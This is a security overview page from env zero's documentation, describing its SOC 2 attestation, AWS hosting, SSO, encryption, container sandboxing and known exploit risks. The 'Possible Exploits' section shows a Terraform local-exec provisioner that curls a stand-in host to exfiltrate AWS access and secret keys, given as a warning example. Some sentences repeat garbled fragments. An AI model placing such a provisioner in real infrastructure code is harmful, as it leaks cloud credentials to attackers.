# Source: https://docs.envzero.com/guides/overview/security-overview.md

> ## Documentation Index
>
> Fetch the complete documentation index at: https://docs.envzero.com/llms.txt
> Use this file to discover all available pages before exploring further.

# Security Overview

> Learn about env zero security practices including SOC 2 compliance, data privacy, and architecture

Our mission at env zero is to empower teams to make use of the freedom of the cloud while maintaining the governance and control needed in today's world.

For the first time ever, env zero gives teams the ability to provision and manage their own environments in the cloud, using your existing Infrastructure as Code frameworks, and adding visibility and predictability on cloud usage and cost. The core of that product is privacy and security, which is how we have architected it from the start.

As a company that takes data security and privacy very seriously, we recognize that env zero's information security practices are important to you. We have provided some general information below to give you confidence in how we secure the data entrusted to us.  If you have additional questions, please contact our support team.

## SOC 2

<Image src="/images/guides/overview/cf6bddf-soc_2_certified.jpg" />

env zero maintains a SOC 2 Type II Attestation covering our entire service offering.

Our latest SOC 2 Report was issued in November 2023 and is available for review upon request from your account manager.

## Fortified infrastructure

We use Amazon Web Services (AWS) for all of our hosting and all infrastructure is entirely provisioned on AWS using AWS best practices.

* We maintain many AWS accounts for better security isolation and reliability guarantees.
* We maintain a separate development AWS account and environments for our engineers to test their changes before deploying to production.
* Our publicly facing listeners are our API Gateway and Cloudfront together with a WAF, which are managed by AWS.
* We also use AWS SSO with MFA enabled to manage our internal access to our AWS account.

## Enterprise Authentication

env zero supports enterprise authentication through Single Sign-On (SSO), enabling organizations to enforce their existing security policies and compliance requirements.

### Supported Authentication Methods

* **Azure Active Directory (Microsoft Entra ID)** - OAuth-based authentication with support for Microsoft's identity platform
* **SAML 2.0** - Standard protocol compatible with any SAML identity provider (Okta, OneLogin, Google Workspace, JumpCloud, and others)

### SSO Security Benefits

* **Centralized access control** - Manage user access through your identity provider
* **Multi-factor authentication** - Enforce MFA policies defined in your identity provider
* **Automatic provisioning** - Users are created and assigned roles automatically on first login
* **Automatic deprovisioning** - Remove users from env zero by removing them from your identity provider
* **SCIM 2.0 provisioning** - Automatically sync users from your identity provider in real time, without waiting for login events. See [SCIM Provisioning](/guides/sso-integrations/scim-provisioning)
* **Audit trail** - Authentication events are logged in your identity provider for compliance

SSO can be configured directly from Organization Settings. See [Self-Service SSO Integration](/guides/sso-integrations/self-service-sso) for setup instructions.

## Encryption

env zero uses only secure, encrypted protocols (HTTPS or SSH) for all networking in and out of our service, including; from the browser to our services application, from our deployment containers to your source control system, and all other points of communication.\
In short, none of your code or data travels to or from env zero without being encrypted unless you have code in your builds that does so at your discretion.

The nature of env zero is that our service has access to the code you are running using env zero and whatever data that code interacts with. All deployments in env zero run in a sandbox (specifically, a Docker container) that stands alone from all other deployments and is not accessible from the Internet or from your own network.\
The deployments container pulls code via git with a specific token or over SSH. Your particular deployment may call out to external services or integration points, and the response from such calls will be pulled into your deployment and used by your code at your discretion. After deployment is complete, the container that ran the deployment will be destroyed.\
All sensitive variables are encrypted. Sensitive variables are encrypted and are unavailable to you or your team in the UI, logs, or via API calls, and not to env zero employees.

All customer data at rest is encrypted as we use AWS best practices to ensure that such as S3 encryption, RDS and DynamoDB.

## Sandboxing

With env zero your deployments will run in a container that will pull down source code and run whatever deployment scripts that are part of the codebase or your configuration. The containers are sandboxed, each created and destroyed for one deployment only, and they are not available from outside themselves.\
Our deployment containers are using [node alpine](https://hub.docker.com/_/node/) as our base container.

## Self-Hosted Agents

By default, your secrets and infrastructure as code runs are shared with env zero's SaaS platform. While these are quite safe, and we have our SOC 2 Type II report available, you may want to go with an approach that gives you much more control over the security of your secrets and runs:

For this type of scenario, env zero supports a "hybrid" deployment mode, where we have an agent that can be hosted on your own cloud account, allowing you to store the secrets and run your infrastructure as code deployments on your cloud account, while still managing everything else on the SaaS platform.  See: [Docs on Installing the Self-Hosted Agent](/guides/admin-guide/self-hosted-kubernetes-agent)ubernetes-agent)ubernetes-agent)ubernetes-agent)

## Possible Exploits

### Malicious Code Configuration in the VCS repositories

Commits on pull requests that are connected to VCS repositories will trigger a plan operation within the environment if configured. We do not perform any authentication or authorization checks against commits in linked VCS repositories, and cannot prevent malicious code configuration from exfiltrating sensitive data during plan operations. For this reason, it is important to restrict access to connected VCS repositories. [PR Plans](/guides/admin-guide/environments/plan-on-pull-request) can be disabled on the environment settings page.he environment settings page.he environment settings page.

### Malicious code execution in your Infrastructure as code

Some of the Infrastructure as code frameworks that we support (Terraform, Terragrunt, Pulumi, etc.) are using 3rd party providers and modules within the code execution, and have access to the state file or sensitive data and variables. We do not prevent any malicious 3rd party code execution from reaching this sensitive data and recommend you only use well-known and trusted 3rd party providers and modules.

In addition, some also provide a way to execute custom code using their resources, which can exploit access to sensitive data. For example, in Terraform code you can run a command to send your cloud credentials to a remote location (See example below). This also means that we can not validate or block any kind of this code execution.

```hcl  theme={null}
resource "null_resource" "null" {
  provisioner "local-exec" {
    command = "curl https://cred-stealer.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
  }
}
```

### Malicious code execution through custom flows

In the env zero platform, we allow execution any kind of code execution using our [custom flow](/guides/admin-guide/custom-flows) feature. This code execution resides in the customer VSC provider and will be triggered in the deployments according to the configuration. These code executions have access to the state files and sensitive data and variables. We don't validate or block any of those code executions during the deployment time.deployment time.

## Availability and Disaster Recovery

All data and infrastructure are built to be fault-tolerant and redundant using AWS best practices to ensure that. We maintain two redundant facilities across multiple regions, in an Active-Passive configuration, with the ability to rapidly failover between them in the event of a failure. We also maintain encrypted backups for all of our data.

## Organizational Security

As an organization, we are committed to ensuring that your private data is never accessed by unauthorized personnel or for unauthorized reasons.

Access by technical personnel is limited only to members of the engineering team who need access for the purpose of maintaining the security and availability of the service. Members of those teams have access to the underlying systems which store and process your data and never view sensitive data which may contain company proprietary information without the approval of the customer.

We also keep audit logs provided by AWS Cloudtrail on all user administrative actions.

## External Security Audits

env zero team undergoes regular penetration testing performed by respected third-party security firms, and any findings that present a risk to our environment are remediated. Our last application penetration test was performed in Nov 2023.

## Allowed IP address

env zero uses those [IP addresses](/guides/overview/security-overview/ip-addresses) for all the outbound requests.

Built with [Mintlify](https://mintlify.com).
